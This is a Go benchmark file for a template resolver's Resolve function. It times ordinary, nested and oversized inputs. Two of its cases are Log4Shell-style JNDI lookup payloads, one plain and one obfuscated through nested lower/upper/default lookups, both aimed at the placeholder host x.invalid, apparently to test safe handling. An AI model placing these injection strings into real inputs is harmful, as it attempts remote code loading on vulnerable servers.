package engine

import (
	"strings"
	"testing"
)

func BenchmarkResolve(b *testing.B) {
	cases := []struct {
		name  string
		input string
	}{
		{"typical-header-no-lookup", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"},
		{"plain-exploit", "${jndi:ldap://x.invalid/a}"},
		{"obfuscated-exploit", "${${lower:j}${upper:n}${::-d}${env:NaN:-i}:${::-l}${::-d}${::-a}${::-p}://x.invalid/a}"},
		{"deeply-nested", strings.Repeat("${lower:", 12) + "a" + strings.Repeat("}", 12)},
		{"template-heavy-64KiB", strings.Repeat("echo ${name} and ${other} ", 2500)},
		{"lookup-heavy-64KiB", strings.Repeat("${lower:A}", 6500)},
	}
	for _, tc := range cases {
		b.Run(tc.name, func(b *testing.B) {
			b.SetBytes(int64(len(tc.input)))
			b.ReportAllocs()
			for b.Loop() {
				_ = Resolve(tc.input, Limits{})
			}
		})
	}
}
